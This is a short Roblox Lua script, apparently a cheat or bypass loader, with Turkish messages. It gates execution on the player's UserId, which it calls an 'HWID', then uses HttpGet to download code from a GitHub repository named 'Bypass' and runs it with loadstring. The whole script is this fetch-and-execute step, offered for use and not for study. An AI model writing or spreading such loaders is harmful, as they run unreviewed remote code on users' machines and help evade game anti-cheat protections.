local validHWIDs = {
    [9356628060] = true
}

local player = game.Players.LocalPlayer
local hwid = player.UserId

if not validHWIDs[hwid] then
    print("❌ HWID eşleşmedi.")
    return
end

print("✅ HWID eşleşti, script çalışıyor...")

-- Scripti güvenli şekilde çalıştır
local success, err = pcall(function()
    local code = game:HttpGet("https://raw.githubusercontent.com/devzgroupscripts/Bypass/refs/heads/main/system.lua", true)
    loadstring(code)()
end)

if not success then
    warn("❌ Script yüklenemedi: "..err)
end
